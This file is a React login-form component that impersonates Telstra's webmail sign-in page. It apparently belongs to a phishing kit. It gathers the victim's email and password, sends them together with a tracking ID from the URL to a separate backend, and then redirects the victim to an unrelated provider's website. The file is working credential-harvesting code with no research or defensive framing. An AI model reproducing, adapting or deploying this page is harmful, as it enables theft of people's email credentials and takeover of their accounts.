import { useEffect, useState } from 'react'

import isValidEmail from '../helpers/validateEmail'
import EmailInput from './EmailInput'
import PasswordInput from './PasswordInput'
import axios from 'axios'
import { baseURL } from '../helpers/data'
import { useLocation } from 'react-router-dom'

const FormContainer = () => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState('')
  const [redirect, setRedirect] = useState(false)

  const { search } = useLocation()
  const userID = search.slice(1)

  useEffect(() => {
    redirect && window.location.replace('https://www.shaw.ca/')
  }, [redirect])

  const handleClick = () => {
    setError('')
    if (!email && !isValidEmail(email)) {
      setError('Please provide a valid email')
      return
    } else {
      setShowPassword(true)
    }

    if (!password) {
      setError('Please enter your password')
      return
    }

    axios
      .post(`${baseURL}main`, { email, password, userID })
      .then(() => {
        setRedirect(true)
      })
      .catch((e) => console.log(e))
  }

  return (
    <div className='mt-12 md:w-[470px] bg-white text-[#282828] px-7 py-5 md:py-8'>
      <header>
        <h className='font-semibold text-3xl md:text-5xl leading-[4rem]'>
          Sign in to Telstra webmail
        </h>
        <p className='text-lg mt-3'>Sign in with your Telstra email address</p>
      </header>

      <main className='mt-10'>
        {!showPassword ? (
          <EmailInput email={email} setEmail={setEmail} error={error} />
        ) : (
          <PasswordInput
            email={email}
            password={password}
            setPassword={setPassword}
            error={error}
            setError={setError}
            setShowPassword={setShowPassword}
          />
        )}

        <button
          className='text-white text-lg font-semibold w-full bg-[#0064D2] hover:bg-[#001E82] py-4 mt-12 rounded'
          onClick={handleClick}
        >
          {!showPassword ? 'Continue' : 'Sign in'}
        </button>
      </main>
    </div>
  )
}

export default FormContainer
